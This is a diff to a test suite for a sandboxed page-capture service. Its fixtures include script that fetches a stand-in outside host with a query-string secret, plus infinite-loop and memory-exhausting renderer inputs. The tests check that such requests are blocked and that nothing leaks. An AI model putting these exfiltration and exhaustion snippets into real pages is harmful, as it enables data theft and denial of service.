@@ -174,7 +174,7 @@ suite("isolated Linux capture service", () => {
   });
   it("captures React, the kit, theme and fonts, with every App call stubbed", () => {
     fixture(
-      `<style>body{font-family:Inter}</style><div id="root"></div><link rel="stylesheet" href="/app-runtime/kit/KIT_VERSION/fonts/fonts.css"><script type="module">import React from '/app-runtime/kit/KIT_VERSION/react.js'; import {createRoot} from '/app-runtime/kit/KIT_VERSION/react.js'; import * as kit from '/app-runtime/kit/KIT_VERSION/kit.js'; createRoot(document.getElementById('root')).render(React.createElement('h1',null,'Kit App')); kit.getContext().then(c=>{document.body.dataset.locale=c.locale;return kit.actions.call('loadRows',{}).catch(e=>{document.body.dataset.code=e.code})});</script>`
+      `<div id="root"></div><link rel="stylesheet" href="/app-runtime/kit/KIT_VERSION/fonts/fonts.css"><link rel="stylesheet" href="/app-runtime/kit/KIT_VERSION/ui.css"><script type="module">import React from '/app-runtime/kit/KIT_VERSION/react.js'; import {createRootRoute} from '/app-runtime/kit/KIT_VERSION/router.js'; import * as kit from '/app-runtime/kit/KIT_VERSION/kit.js'; const routeTree=createRootRoute({component:()=>React.createElement('h1',{style:{fontFamily:'Inter'}},'Kit App')}); await kit.mountApp({routeTree}); const c=await kit.getContext(); if(c.locale!=='de'||c.mode!=='dark') throw Error('Wrong capture context'); kit.actions.call('loadRows',{}).catch(e=>{document.body.dataset.code=e.code});</script>`
     );
     const result = capture({
       size: "phone",
@@ -188,13 +188,14 @@ suite("isolated Linux capture service", () => {
     const served = peer("console.log(await (await fetch('http://127.0.0.1:4100/served')).text())");
     writeFileSync(".tmp/capture-proof/phone-dark.webp", Buffer.from(result.image, "base64"));
     expect(result.calls).toContainEqual({ name: "loadRows", code: "not_available" });
+    expect(served).toContain("ui.css");
     expect(served).toContain("react.js");
     expect(served).toContain("kit.js");
     expect(served).toContain("woff2");
   });
   it("blocks published outside hosts and unrelated API paths and omits queries from diagnostics", () => {
     fixture(
-      `<h1>Network refusals</h1><script>fetch('https://outside.example/pixel?secret=hidden');fetch('/unexpected/users?secret=hidden');</script>`
+      `<h1>Network refusals</h1><script>fetch('https://outside.example/pixel?secret=hidden');fetch('http://interface.invalid/unexpected/users?secret=hidden');</script><img src='https://outside.example/image?secret=hidden'>`
     );
     const result = capture();
     expect(result.status).toBe("done");
@@ -203,6 +204,16 @@ suite("isolated Linux capture service", () => {
       method: "GET",
       host: "outside.example",
       path: "/pixel"
+    });
+    expect(result.blocked).toContainEqual({
+      method: "CSP",
+      host: "interface.invalid",
+      path: "/unexpected/users"
+    });
+    expect(result.blocked).toContainEqual({
+      method: "GET",
+      host: "outside.example",
+      path: "/image"
     });
     expect(JSON.stringify(result.blocked)).not.toContain("hidden");
     expect(
@@ -222,6 +233,18 @@ suite("isolated Linux capture service", () => {
     if (result.status !== "done") throw new Error("capture failed");
     expect(JSON.stringify(result.report)).not.toContain("leaked");
     expect(docker("exec", service, "find", "/tmp", "-name", "capture-leak.txt").trim()).toBe("");
+    expect(
+      docker(
+        "exec",
+        service,
+        "find",
+        "/tmp",
+        "-path",
+        "*/playwright-artifacts-*/*",
+        "-type",
+        "f"
+      ).trim()
+    ).toBe("");
   });
   it.each(["while(true){}", "const held=[];for(;;)held.push(new Uint8Array(1024*1024).fill(1))"])(
     "ends a stuck renderer and the next capture succeeds: %s",
